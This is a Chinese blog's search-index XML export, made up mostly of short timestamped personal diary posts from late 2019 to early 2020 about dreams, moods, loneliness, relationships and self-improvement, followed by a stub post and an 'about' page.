<p>2019-10-12 13:29:41<br>昨天晚上做的梦把人吓得不轻，我居然和我妈妈谈恋爱，然后她还在我耳边很暧昧地说“妈妈爱你”……我成了我爸爸的情敌……还梦到青蛇和白蛇很相爱……不敢回忆了，这都是些什么梦啊</p>
</blockquote>
<blockquote>
<p>2019-10-15 13:07:01<br>昨天晚上做梦，梦到在看一本山海经，现在还记得的内容就是讲了太阳有两兄弟，其中一个叫小人，后来死了。还有太阳车什么的，很奇幻，刚把第四章看我，出现第五章首页的时候，就突然醒了。</p>
</blockquote>
<blockquote>
<p>2019-10-16 00:05:23<br>翻译那些生涩难懂的话真挺累的。简单点说话不是方便大家吗</p>
</blockquote>
<blockquote>
<p>2019-10-19 04:11:16<br>努力用错方向，天才放错地方，结局都一样</p>
</blockquote>
<blockquote>
<p>2019-10-20 07:30:57<br>我觉得我应该去买一本周公解梦，每天早上起来都要访问一下周公解梦网站……</p>
</blockquote>
<blockquote>
<p>2019-10-23 09:36:31<br>自己职责内的事情就要自己上心，出了问题怪谁呢，没人喜欢当令人厌烦的管家婆</p>
</blockquote>
<blockquote>
<p>2019-10-24 00:55:48<br>现在满脑子都是各种好吃的东西，不知道今天晚上做梦会不会流口水</p>
</blockquote>
<blockquote>
<p>2019-10-25 14:52:54<br>算了，周公都解不了我的梦</p>
</blockquote>
<blockquote>
<p>2019-10-26 22:49:09<br>周末不来烦我就已经是谢天谢地了</p>
</blockquote>
<blockquote>
<p>2019-10-26 22:51:42<br>讨价还价，得便宜卖乖的有多远走多远吧</p>
</blockquote>
<blockquote>
<p>2019-10-30 12:29:25<br>我最不能接受的是没有方向，像无头苍蝇一样乱撞</p>
</blockquote>
<blockquote>
<p>2019-10-31 00:56:41<br>好像是从十三岁开始，就把自己缩进了壳里面。</p>
</blockquote>
<blockquote>
<p>2019-10-31 11:17:32<br>嗯，都是大爷</p>
</blockquote>
<blockquote>
<p>2019-11-01 13:29:55<br>低级的欲望放纵就可以得到，高级的欲望要靠努力克制低级欲望才可能得到。</p>
</blockquote>
<blockquote>
<p>2019-11-03 00:03:15<br>今天晚上做个什么梦好呢，翻来覆去到现在都没想好</p>
</blockquote>
<blockquote>
<p>2019-11-03 23:11:47<br>只能用一首月光形容我现在的心情</p>
</blockquote>
<blockquote>
<p>2019-11-04 00:59:54<br>我也拿自己没法了，硬是睡不着，明明很困</p>
</blockquote>
<blockquote>
<p>2019-11-05 01:15:25<br>走路的时候，走路;吃饭的时候，吃饭</p>
</blockquote>
<blockquote>
<p>2019-11-05 01:42:57<br>当我恢复求知欲之后，一切都开始变得有趣</p>
</blockquote>
<blockquote>
<p>2019-11-05 13:06:11<br>应该差不多有大半年没体验痛经的感觉吧，痛还是一件让人高兴的事呢</p>
</blockquote>
<blockquote>
<p>2019-11-06 01:36:18<br>一旦发现新鲜感消失了，就像生命都枯萎了一样，任何时候都不能让自己处于停滞的状态，裹足不前就是在倒退</p>
</blockquote>
<blockquote>
<p>2019-11-06 11:12:49<br>卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆卡爆</p>
</blockquote>
<blockquote>
<p>2019-11-06 12:35:24<br>当我不再伤春悲秋的时候，才表示还活着</p>
</blockquote>
<blockquote>
<p>2019-11-07 00:26:14<br>终于把我杂乱无章的onenote整理完了，手差点抽筋。更刺激的是杯子的水洒到键盘上，电脑差点就一命呜呼。今天晚上真的是手贱，不小心删了几个重要的东西。</p>
</blockquote>
<blockquote>
<p>2019-11-07 22:32:27<br>好像我的时间就能随便浪费一样，真的是搞笑</p>
</blockquote>
<blockquote>
<p>2019-11-09 00:47:18<br>为了2019年初立下的flag现在疯狂地补作业，建个人博客这个flag不会倒</p>
</blockquote>
<blockquote>
<p>2019-11-09 05:17:18<br>差点没痛死过去</p>
</blockquote>
<blockquote>
<p>2019-11-09 12:30:22<br>太不容易了，我的google play store终于可以用了</p>
</blockquote>
<blockquote>
<p>2019-11-09 17:36:09<br>行远必自迩，登高必自卑。</p>
</blockquote>
<blockquote>
<p>2019-11-11 13:01:22<br>automation is in order to save time, so we don’t have any qualms about wasting  extra time that we have saved.</p>
</blockquote>
<blockquote>
<p>2019-11-12 20:56:19<br>突然觉得很难过，经常都在怀疑自己有病</p>
</blockquote>
<blockquote>
<p>2019-11-13 17:52:52<br>有获得必然有失去，有人获得必然有人失去。希望获得或者想有人获得的话就必须承担失去的风险，做好失去的准备。不想失去或者不想有人失去的话就不要妄想去获得。</p>
</blockquote>
<blockquote>
<p>2019-11-14 01:14:35<br>我发现我好多技能都是硬着头皮上，就学会了。</p>
</blockquote>
<blockquote>
<p>2019-11-14 13:55:20<br>工具控，方法控，体验控，好奇一切新鲜的。</p>
</blockquote>
<blockquote>
<p>2019-11-15 01:28:44<br>死亡搁浅，tag it</p>
</blockquote>
<blockquote>
<p>2019-11-15 23:02:21<br>今天还是乖乖早睡吧，红色警告</p>
</blockquote>
<blockquote>
<p>2019-11-16 09:26:34<br>每天都收到订阅的博客推送，就觉得自己懒下去都不好意思，那么忙的人都能坚持每天写一篇博客</p>
</blockquote>
<blockquote>
<p>2019-11-18 00:48:45<br>you can do anything to me. I give you this privilege because I believe that you won’t hurt me.</p>
</blockquote>
<blockquote>
<p>2019-11-19 01:09:12<br>真的怀疑过性取向</p>
</blockquote>
<blockquote>
<p>2019-11-19 04:03:18<br>玩魔方到现在</p>
</blockquote>
<blockquote>
<p>2019-11-19 12:30:56<br>极致的幸福，存在于孤独的深海。</p>
</blockquote>
<blockquote>
<p>2019-11-19 14:38:35<br>很多拖着的事情该好好想一想了，坦诚待己。</p>
</blockquote>
<blockquote>
<p>2019-11-19 15:09:11<br>骄傲受到了卑微的威胁，而这种卑微来自于爱情。如何有尊严地爱一个人，这是我最想知道的答案。</p>
</blockquote>
<blockquote>
<p>2019-11-19 15:15:11<br>发送的信号接收不到同频的响应，是因为同频存在干扰，而这是个充斥着规则和秩序的世界，容不得一丝干扰破坏。</p>
</blockquote>
<blockquote>
<p>2019-11-19 15:19:59<br>我体内可能有小丑的基因。</p>
</blockquote>
<blockquote>
<p>2019-11-19 21:52:56<br>我姐说我成熟了。</p>
</blockquote>
<blockquote>
<p>2019-11-20 18:42:58<br>优秀的无法被模仿，东施效颦就是这个意思。</p>
</blockquote>
<blockquote>
<p>2019-11-20 22:57:44<br>明年三月份我要染上粉色头发，去日本看樱花。</p>
</blockquote>
<blockquote>
<p>2019-11-21 07:10:10<br>每天早上，都是与温暖的被窝难舍难分的时候。</p>
</blockquote>
<blockquote>
<p>2019-11-21 07:33:52<br>定期给自己打鸡血是很有必要的，因为不知不觉血槽就空了。</p>
</blockquote>
<blockquote>
<p>2019-11-21 22:11:45<br>人变来变去的，最后得出的结论不过是不变的时候最好。</p>
</blockquote>
<blockquote>
<p>2019-11-21 23:10:44<br>小x有点累了</p>
</blockquote>
<blockquote>
<p>2019-11-21 23:47:34<br>都不用盘算着怎么从背后插刀子，我允许你捅向我的心窝子，这样的话，心就好彻底死了。</p>
</blockquote>
<blockquote>
<p>2019-11-22 00:24:02<br>已经好久没有和朋友手挽手了</p>
</blockquote>
<blockquote>
<p>2019-11-22 01:16:10<br>睡不着，想的太多太多了，忍不住想那些有的没的</p>
</blockquote>
<blockquote>
<p>2019-11-22 18:09:31<br>不管多热烈，都会冷却</p>
</blockquote>
<blockquote>
<p>2019-11-22 18:22:50<br>我们都有一个罐子，里面存放了各种各样的情绪。当我们靠得特别近的时候，我就从罐子里拿一点快乐出来给你保管，但是却不知不觉往罐子里存下了悲伤的种子，等到哪一天，你把我寄存的快乐弄丢了，种子就开始发芽。</p>
</blockquote>
<blockquote>
<p>2019-11-22 21:19:23<br>记住，你是骄傲的射手</p>
</blockquote>
<blockquote>
<p>2019-11-23 11:04:05<br>昨天晚上做梦把burp整好了都觉得好高兴。</p>
</blockquote>
<blockquote>
<p>2019-11-23 12:02:10<br>我说想你的时候，如果你没有在想我，也不用骗我说想我。</p>
</blockquote>
<blockquote>
<p>2019-11-23 12:05:34<br>因为比起你骗我，你没有在想我这个事实比较不让人难受</p>
</blockquote>
<blockquote>
<p>2019-11-23 18:19:36<br>我那肉眼可见的卑微终将一点点消耗殆尽</p>
</blockquote>
<blockquote>
<p>2019-11-23 21:10:07<br>忍住忍住，管住嘴</p>
</blockquote>
<blockquote>
<p>2019-11-24 00:23:53<br>第三层太难了，明天继续</p>
</blockquote>
<blockquote>
<p>2019-11-24 23:40:48<br>突然觉得自己有点猥琐，学的是幼儿班魔方教程幼儿班教程比较适合我</p>
</blockquote>
<blockquote>
<p>2019-11-25 11:35:43<br>总觉得鼓捣魔方可以缓解鼠标手</p>
</blockquote>
<blockquote>
<p>2019-11-25 11:36:20<br>谢谢每一颗真心</p>
</blockquote>
<blockquote>
<p>2019-11-25 18:51:02<br>有一句话这么说的，你不傻谁和你做朋友啊。所以这就是我傻的理由吗？</p>
</blockquote>
<blockquote>
<p>2019-11-25 18:52:13<br>这样忧郁的自己，我也喜欢不起来。</p>
</blockquote>
<blockquote>
<p>2019-11-25 21:22:08<br>中国特色这几个字的意思太深了，真不好理解</p>
</blockquote>
<blockquote>
<p>2019-11-26 00:45:23<br>我都好怕自己突然没想通就疯掉了</p>
</blockquote>
<blockquote>
<p>2019-11-27 12:29:03<br>又是既视感，今天的微博热点我似乎看到过</p>
</blockquote>
<blockquote>
<p>2019-11-28 21:56:46<br>做一头不被叫醒的沉睡的猪</p>
</blockquote>
<blockquote>
<p>2019-11-28 21:58:42<br>彩虹出现了，曾经的风雨才有意义。</p>
</blockquote>
<blockquote>
<p>2019-11-28 22:31:13<br>我们的梦想对现实的压榨应该有边界</p>
</blockquote>
<blockquote>
<p>2019-11-28 22:47:53<br>我发现我的自愈能力出奇的好，不管是身体上还是心理上。</p>
</blockquote>
<blockquote>
<p>2019-11-29 01:19:04<br>我觉得，父母拿孩子的大头照做头像，在一定程度上侵犯了孩子的肖像权，虽然孩子并没有这个意识。</p>
</blockquote>
<blockquote>
<p>2019-11-29 01:20:52<br>在清醒的状态下总有犯不完的糊涂</p>
</blockquote>
<blockquote>
<p>2019-11-29 01:22:23<br>我希望自己的人生是独特的，又有点害怕为了独特而付出的代价</p>
</blockquote>
<blockquote>
<p>2019-11-29 01:24:59<br>但是我们活着，就是要找出存在的价值，把自己从人群中区分出来，大家都是同一物种，但是各自的主题不同。</p>
</blockquote>
<blockquote>
<p>2019-11-29 01:27:47<br>DNA，基因，生命，宇宙，存在，消失，永动机，介质，连接，信号，频率，万物互联，人，机器。</p>
</blockquote>
<blockquote>
<p>2019-11-29 01:29:32<br>好奇是我生命的燃料。失去好奇心的状态即是行尸走肉。</p>
</blockquote>
<blockquote>
<p>2019-12-01 01:57:39<br>是应该为自己的人生创造点什么</p>
</blockquote>
<blockquote>
<p>2019-12-01 02:00:26<br>许多事情，没有道理，没有范本，没有参考，只有自己试错，代价会有，受伤会有，遗憾会有，但是，经历是一种值得，注定发生的，就拥抱发生，也许是一堂特别的课程，于你，于我。</p>
</blockquote>
<blockquote>
<p>2019-12-01 02:02:14<br>不管处在何种环境何种趋势，不要停下思考，不要停下自我实现，一切结果不找理由，找原因。对自己的懈怠，是对自己的不负责。</p>
</blockquote>
<blockquote>
<p>2019-12-04 02:14:29<br>想得太多，就睡不着，我现在只想把脑袋扔了。</p>
</blockquote>
<blockquote>
<p>2019-12-04 13:01:21<br>不小心在qq空间的推荐看到那种长得诱惑十足的女生扭来扭去，心里疑惑满满，会有人喜欢这种？我反正是觉得别扭，对于表演者和围观者的心态感到好奇。也不是那种纯的低俗，就是怪怪的。</p>
</blockquote>
<blockquote>
<p>2019-12-09 07:44:21<br>我并不总是有空，让你感觉到随时有空其实我的私心允许难得的计划外打乱我的时间安排。我是把每一次和你的见面当作最后一次来对待的，因为骨子里我还是个悲观理性者。但是我在考虑这私心似乎不值得，因为这建立在失去自我的基础上，失去自我是一件多么廉价且掉价的事。</p>
</blockquote>
<blockquote>
<p>2019-12-09 07:53:50<br>想了想，刚刚说的那些行为可不就是easy girl 吗，天哪，不能做easy girl.</p>
</blockquote>
<blockquote>
<p>2019-12-10 00:19:33<br>接受自己，同时为了更好的自己而努力，good night </p>
</blockquote>
<blockquote>
<p>2019-12-10 09:13:28<br>元旦之前，拒绝胡吃海喝</p>
</blockquote>
<blockquote>
<p>2019-12-10 19:57:40<br>今天手贱得紧，两台机器都被我搞死了</p>
</blockquote>
<blockquote>
<p>2019-12-11 00:03:00<br>又发现一座宝藏!学习!太需要这种指导了</p>
</blockquote>
<blockquote>
<p>2019-12-11 00:03:43<br>虽说遗忘是天性，但被记住还是让人开心的</p>
</blockquote>
<blockquote>
<p>2019-12-11 00:04:07<br>good night</p>
</blockquote>
<blockquote>
<p>2019-12-11 23:24:44<br>不去试试怎么知道合不合适，不去试试怎么知道对还是错</p>
</blockquote>
<blockquote>
<p>2019-12-12 22:28:31<br>“如果一种规律预示的事情要发生，它是不以人的意志为转移、一定会发生的。”</p>
</blockquote>
<blockquote>
<p>2019-12-14 03:04:29<br>没有晚点，开心</p>
</blockquote>
<blockquote>
<p>2019-12-14 20:31:16<br>明天让我活着回去就行</p>
</blockquote>
<blockquote>
<p>2019-12-18 18:00:39<br>希望年前顺利收账</p>
</blockquote>
<blockquote>
<p>2019-12-19 09:25:53<br>计划不必太过缜密，但必须足够宏大，宏大到一想起就心潮澎湃。A计划预想中……</p>
</blockquote>
<blockquote>
<p>2019-12-19 18:18:33<br>我们会喜欢和自己相似的人，也许有相似的优点，或者相似的缺点。我们也会羡慕那些具备我们无法具备的特质的人，不一定会喜欢，有时甚至会嫉妒。</p>
</blockquote>
<blockquote>
<p>2019-12-21 12:57:21<br>狼可以选择吃绵羊或者吃兔子，绵羊可以选择被狮子吃，兔子也可以选择吃红萝卜或白萝卜。总之，就是随心情而已啦，一切的喜恶都是这样。</p>
</blockquote>
<blockquote>
<p>2019-12-21 19:16:24<br>此刻有一个强烈的预感，那就是我一定会幸福的!</p>
</blockquote>
<blockquote>
<p>2019-12-22 00:41:04<br>畸形的关系应该决断了。嗯。对。这是对的。</p>
</blockquote>
<blockquote>
<p>2019-12-22 01:01:30<br>在成都也是漂，就还挺想去个其他地方漂。</p>
</blockquote>
<blockquote>
<p>2019-12-23 13:01:07<br>一个苹果，不会因为没有比橘子好吃而难过，它只会因为别人都喜欢吃其他苹果而难过。</p>
</blockquote>
<blockquote>
<p>2019-12-24 05:46:14<br>强大的官本位系统，不过是在支撑着心中的虚荣，虚荣这东西，要靠千娇百媚来供养的。</p>
</blockquote>
<blockquote>
<p>2019-12-24 05:58:02<br>谁又能准确地预判从1到2是1+1=2的增量变化，还是从2的零次方到2的一次方这样的指数级变化。趋势，就是每个人都能瞎想的，只有时间知道答案。和天气预报一样的道理。</p>
</blockquote>
<blockquote>
<p>2019-12-24 06:02:11<br>不能因为在春天路过的都是整片花开，就认定花会永生。也不能因为在沙漠路过的都是荒原，就认定世界上没有花。季节性，地域性的存在，总是让人产生太多臆测。</p>
</blockquote>
<blockquote>
<p>2019-12-24 06:13:32<br>恍然明白过来，人家说你不计较，其实就是在说你傻……不过既然不计较，也就不在乎人家说你傻了</p>
</blockquote>
<blockquote>
<p>2019-12-24 06:18:17<br>人家生产什么，你只能消费什么，除非成为生产者，并且自给自足。</p>
</blockquote>
<blockquote>
<p>2019-12-24 06:24:36<br>物理应该是哲学的必修课</p>
</blockquote>
<blockquote>
<p>2019-12-27 19:02:49<br>当强烈的孤独感来袭时，就仿佛所有人的孤独都在往我身上填。肉身已经装不满了，溢出的孤独不过是落在冰面无法消融的雪。</p>
</blockquote>
<blockquote>
<p>2019-12-29 00:25:24<br>其实也不必自作多情地设置朋友圈的访问权限，查看范围。关心你的人，才会偶尔看看，其他不相干的人，手指滑一滑也就过去了，你的开心与不开心也没多少人在意。索性就让它大大方方地开放，接受自己的各种状态。</p>
</blockquote>
<blockquote>
<p>2019-12-29 01:01:28<br>我们喜欢的一切人事物就构成了我们的个体。一部分一部分一部分，拼凑着，影响着。</p>
</blockquote>
<blockquote>
<p>2019-12-29 11:15:49<br>我到底在舍不得什么，在顾虑什么，明明离开的方式很简单也很多。这是我拖延症最严重的一件事。不喜欢这样拖泥带水的自己。理智都被狗吃了吗？</p>
</blockquote>
<blockquote>
<p>2019-12-29 11:36:13<br>室友的妈妈来看她了，好羡慕呀</p>
</blockquote>
<blockquote>
<p>2019-12-29 18:32:17<br>越是分析，越是发现，自己在退步，在心理方面越来越不健全，进入青春期之后，一点点开始腐蚀自我。要怎么办啊，真是一个难题。</p>
</blockquote>
<blockquote>
<p>2019-12-29 19:29:13<br>距离太遥远，差异太明显，揪着不放很没意思。</p>
</blockquote>
<blockquote>
<p>2019-12-29 23:43:19<br>自我批评自我批评自我批评自我批评自我批评自我批评自我批评自我批评自我批评自我批评自我批评自我批评自我批评自我批评自我批评自我批评自我批评自我批评自我批评自我批评自我批评自我批评自我批评自我批评自我批评自我批评自我批评自我批评自我批评自我批评自我批评自我批评自我批评自我批评自我批评</p>
</blockquote>
<blockquote>
<p>2019-12-30 00:15:33<br>毕业答辩的时候，我以为糟心的事就快结束了，事实证明这种想法太天真，糟心的事永远不会结束，除非生命结束。他们会一桩桩地，甚至会挤破脑袋想和你见面。应接不暇就是他们想要给你制造的场面。</p>
</blockquote>
<blockquote>
<p>2019-12-30 21:55:27<br>保留几分给自己</p>
</blockquote>
<blockquote>
<p>2019-12-30 23:15:17<br>I need some cigarette </p>
</blockquote>
<blockquote>
<p>2020-01-02 00:27:00<br>1月1日，第一次认识晓雪。也许新的一年就这么悄悄地发生变化。</p>
</blockquote>
<blockquote>
<p>2020-01-02 11:00:46<br>20岁就踏上financial strain之路，这种状态持续到22岁，希望尽早摆脱吧。</p>
</blockquote>
<blockquote>
<p>2020-01-02 20:18:47<br>人还真是奇怪，你给他尊重，人家就自以为高人一等了。你应付领导，和我也没有太大关系吧，对你要紧，对我却不打紧，寻求帮助也没有这种理直气壮的态度吧。其实很烦这种围着领导转的作风。</p>
</blockquote>
<blockquote>
<p>2020-01-02 20:20:01<br>以上是一颗小小螺丝钉悄咪咪的抱怨</p>
</blockquote>
<blockquote>
<p>2020-01-02 20:37:49<br>不自觉地手抖</p>
</blockquote>
<blockquote>
<p>2020-01-02 22:24:07<br>烟花当是所有花的榜样，要么绽放要么死去。</p>
</blockquote>
<blockquote>
<p>2020-01-02 22:24:27<br>就是不能枯萎</p>
</blockquote>
<blockquote>
<p>2020-01-02 23:07:39<br>常常都在幻想用一把匕首刺向胸口，鲜血汩汩地往外冒的场景，血腥新奇，甚至有几分浪漫，好像有些变态了。</p>
</blockquote>
<blockquote>
<p>2020-01-03 01:02:28<br>特别不喜欢「爱过」这个词，这无非是把「不爱了」这个原本就凄凉的词加上了着重号。</p>
</blockquote>
<blockquote>
<p>2020-01-03 02:09:40<br>以前在宿舍用热得快，宿管阿姨趁我们上课去了，偷偷给我们没收了，有几次甚至直接把线剪了。真是让人哭笑不得。</p>
</blockquote>
<blockquote>
<p>2020-01-04 10:06:47<br>我清楚地知道我现在不够好，但是我一定会变好</p>
</blockquote>
<blockquote>
<p>2020-01-04 23:09:33<br>我好像太天真了</p>
</blockquote>
<blockquote>
<p>2020-01-04 23:35:21<br>如果你不是你，我也不是我，该多好啊。很想放肆地矫情，但是因为你是你，我是我，所以要忍住，忍的过程就是会难受。把难受都留给我吧。就这样。就这样。就这样。这样的坚持耗费我好多意志力。</p>
</blockquote>
<blockquote>
<p>2020-01-05 22:35:04<br>不管怎么说，不管过去的自己是开心还是难过，是矫情还是抱怨，各种情绪，我也还是会和过去的自己做朋友，就像不管现在的我有多糟糕，未来的我也不会厌弃现在的我。</p>
</blockquote>
<blockquote>
<p>2020-01-06 12:38:09<br>烂尾楼应该继续修缮还是推倒重建，心中建起的烂尾楼在拆之前还是会有几分怀恋。</p>
</blockquote>
<blockquote>
<p>2020-01-08 03:34:39<br>终于把这件拖了一年的心愿完成了，敢在截止日期完成。以后常更新博客。</p>
</blockquote>
<blockquote>
<p>2020-01-08 03:37:49<br>然后就是向优秀的人儿看齐。</p>
</blockquote>
<blockquote>
<p>2020-01-08 18:28:48<br>RTFM：Read The Fucking Manual<br>STFW：Search The Fucking Web</p>
</blockquote>
<blockquote>
<p>2020-01-08 18:37:50<br>trade-off 此消彼长</p>
</blockquote>
<blockquote>
<p>2020-01-08 19:09:38<br>“有很多问题的答案其实是“你的智力不适合干这个”，但又不能直接这么说，必须绕很大一个弯子，但由于毕竟“你的智力不适合干这个”，所以绕个弯子对方就看不懂这层意思了……” ​​​​</p>
</blockquote>
<blockquote>
<p>2020-01-09 03:35:59<br>已陷入知识焦虑，太多需要学的了</p>
</blockquote>
<blockquote>
<p>2020-01-10 09:14:19<br>从自己零星的记录中，发现一个铁律。一个想法从产生到落地，想法产生之后将它流放，一年甚至两年之后才会因为受到环境刺激，将想法付诸行动。所以，给自己找刺激，是推动搁置计划的一个方法。</p>
</blockquote>
<blockquote>
<p>2020-01-10 22:16:15<br>我试图整理我自己，一旦触及一点思绪，就发现是一团乱麻，也没有具体想某件事或者某个主题，毫无源头地陷入思考的网，不知道最后应该理出个什么头绪，在这样的状态下，做什么都打不起精神。</p>
</blockquote>
<blockquote>
<p>2020-01-10 22:38:58<br>2020潘通色blue，早上脑子里哼的是红色高跟鞋，今年蓝色高跟鞋应该很流行。</p>
</blockquote>
<blockquote>
<p>2020-01-10 22:39:51<br>附条件的肯定，附条件的否定，这两种方式都可以表达相同的立场。</p>
</blockquote>
<blockquote>
<p>2020-01-10 22:42:18<br>我发现大脑也不喜欢枯燥的玩意儿，如果你持续做一件纯靠意志力驱动的事情，它就会奋起反抗，开小差算是轻的了。</p>
</blockquote>
<blockquote>
<p>2020-01-10 22:46:30<br>我们应当擅长为自己的戏剧搭建合适的布景，什么时间，在什么地方，做什么事，脑海里播放什么背景音乐。要达到这样的境界，应当需要第二个脑袋，由它来统筹现有的脑袋，控制住不能让这颗脑袋偷懒罢工喊口号游行。</p>
</blockquote>
<blockquote>
<p>2020-01-10 22:47:52<br>制造远大前程的假象，有用吗？no小黑屋还是小黑屋，变不成金碧辉煌的殿堂。</p>
</blockquote>
<blockquote>
<p>2020-01-11 05:05:16<br>不知道晚上怎么睡着的，灯也没关，现在醒了。幸好没被kindle砸到。</p>
</blockquote>
<blockquote>
<p>2020-01-11 06:09:30<br>人艰不拆，有些问题不需要得到确定的答案，如果你已经直觉到对方的答案，就不用去证实了。</p>
</blockquote>
<blockquote>
<p>2020-01-11 07:06:53<br>脑海里突然闪过一个从没听说过的名字，璐家琪</p>
</blockquote>
<blockquote>
<p>2020-01-11 22:57:16<br>聊天用句号收尾太装13了</p>
</blockquote>
<blockquote>
<p>2020-01-12 01:15:35<br>我的愿望太多了了了了了了了了了了了了了了了了了了了了了了了了了了了了了!</p>
</blockquote>
<blockquote>
<p>2020-01-12 22:02:51<br>2月15日之前。最多坚持到这天。</p>
</blockquote>
<blockquote>
<p>2020-01-12 22:31:36<br>悲伤留给自己。悲伤不能分享。</p>
</blockquote>
]]></content>
      <categories>
        <category>最熟悉的陌生人，让我好好了解一下你</category>
      </categories>
      <tags>
        <tag>心的旅程</tag>
      </tags>
  </entry>
  <entry>
    <title>迪士尼新动向</title>
    <url>//posts/ZH-CN/null.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>经济学人浓咖啡马拉松计划doing！第-xx天。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="喝吧"><a href="#喝吧" class="headerlink" title="喝吧"></a>喝吧</h2>]]></content>
  </entry>
  <entry>
    <title>about</title>
    <url>/about/index.html</url>
    <content><![CDATA[<p>全网同号🙋‍♀️<br>野生项目经理🤡<br>互联网行业的英语咖🤓<br>本地化行业的技术咖🌐<br>爱分享，爱极客，欢迎交流外星科技🙈<br>欢迎关注我的微信公众号，交流IT、英语方面学习心得^.*<br><img src="https://v2ray.dana5haw.com:8008/images/2021/08/03/qrcode_for_gh_9b7280eb1edc_258.jpg" alt="qrcode_for_gh_9b7280eb1edc_258.jpg"></p>
]]></content>
  </entry>
  <entry>
    <title>categories</title>
    <url>/categories/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>tags</title>
    <url>/tags/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
</search>
